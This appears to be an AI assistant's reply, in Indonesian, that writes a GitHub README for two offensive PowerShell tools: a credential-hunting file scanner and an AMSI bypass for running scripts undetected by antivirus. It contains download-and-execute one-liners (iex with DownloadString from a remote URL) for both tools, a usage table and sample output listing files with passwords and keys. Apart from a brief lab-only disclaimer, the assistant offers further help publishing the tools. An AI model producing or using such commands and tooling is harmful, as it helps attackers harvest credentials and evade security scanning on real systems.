Berikut isi lengkap `README.md` dalam format markdown, siap Bos paste langsung ke repo GitHub:

````markdown
# 🕵️ Invoke-FileHunter & AMSI Bypass Tools

PowerShell tool untuk:

- Mencari file konfigurasi yang berisi credential atau data sensitif (Invoke-FileHunter)
- Melewati Antimalware Scan Interface agar script PowerShell bisa dijalankan tanpa deteksi (AMSI Bypass)

---

## 📦 1. Cara Pakai Invoke-FileHunter

Buka PowerShell dengan hak akses Administrator, lalu jalankan:

```powershell
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/irsyad521/PowershellScript/refs/heads/main/Invoke-FileHunter.ps1')
Invoke-FileHunter -Path "C:\" -OutputLog "C:\Users\Public\Documents\ScanResults.txt"
````

### 🔧 Parameter

| Parameter    | Deskripsi                                                              | Default                                     |
| ------------ | ---------------------------------------------------------------------- | ------------------------------------------- |
| `-Path`      | Lokasi direktori yang ingin dipindai                                   | `C:\`                                       |
| `-OutputLog` | Lokasi file hasil scan (berisi file + keyword sensitif yang ditemukan) | `C:\Users\Public\Documents\ScanResults.txt` |

### 🧪 Contoh:


Invoke-FileHunter -Path "C:\" -OutputLog "C:\Users\Public\Documents\ScanResults.txt"
Invoke-FileHunter -Path "$env:USERPROFILE\Desktop" -OutputLog "C:\Users\Public\Documents\DesktopScan.txt"


---

## 🔓 2. Cara Pakai AMSI Bypass

Jika PowerShell memblokir script karena terdeteksi sebagai malicious, aktifkan bypass terlebih dahulu:

```powershell
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/irsyad521/PowershellScript/refs/heads/main/amsi-bypass.ps1')
Invoke-BypassAMSIVersion3
```

> ⚠️ **PERINGATAN:**
> AMSI Bypass dapat digunakan untuk menjalankan script yang diblokir oleh antivirus. Gunakan hanya di lab/pengujian atau sistem milik sendiri. Jangan gunakan untuk tujuan ilegal.

---

## 📄 Hasil Scan

Hasil dari `Invoke-FileHunter` akan disimpan ke file log. Contoh isi file hasil:

```
C:\inetpub\wwwroot\web.config - Found keywords: password, key
C:\Users\user\Documents\db_config.ini - Found keywords: password
```

---

## 📝 Catatan

* Jalankan PowerShell **sebagai Administrator**.
* Hindari scanning folder seperti `C:\Windows\WinSxS` untuk mengurangi waktu eksekusi.
* Tools ini tidak membuat perubahan di sistem—hanya membaca file.

---

## 📬 Kontak

Script ini dikembangkan oleh [Irsyad](https://github.com/irsyad521)
Silakan buka issue atau pull request jika ada bug, saran, atau perbaikan.

---

Terima kasih sudah menggunakan tools ini!

```

Kalau mau saya bantu buat `.md`-nya langsung atau mau auto-upload ke GitHub pakai script PowerShell juga bisa, tinggal perintahin aja, Bos!
```
